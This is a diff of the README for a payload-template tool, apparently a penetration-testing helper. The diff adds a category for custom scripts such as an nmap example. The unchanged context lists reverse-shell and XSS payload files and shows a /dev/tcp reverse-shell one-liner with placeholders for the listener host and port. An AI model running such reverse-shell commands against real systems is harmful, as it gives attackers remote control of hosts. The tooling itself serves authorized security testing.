@@ -253,6 +253,8 @@ payloads/
       nc-mkfifo
     windows/
       powershell-rev
+  script/
+    nmap-example
   xss/
     basic-alert
 ```
@@ -263,11 +265,16 @@ Use `${JJ_NAME}` placeholders:
 /bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
 ```
 
+Files under `payloads/script/` are for custom scripts. They may use `${JJ_NAME}`
+placeholders, or they may use literal shell variables such as `$rhost`; when no
+renderable `${JJ_*}` placeholder is present, `ii p` copies the script text as-is.
+
 Filter payloads by category:
 
 ```zsh
 ii p
 ii p shell
+ii p script
 ii p linux
 ii p windows
 ii p xss
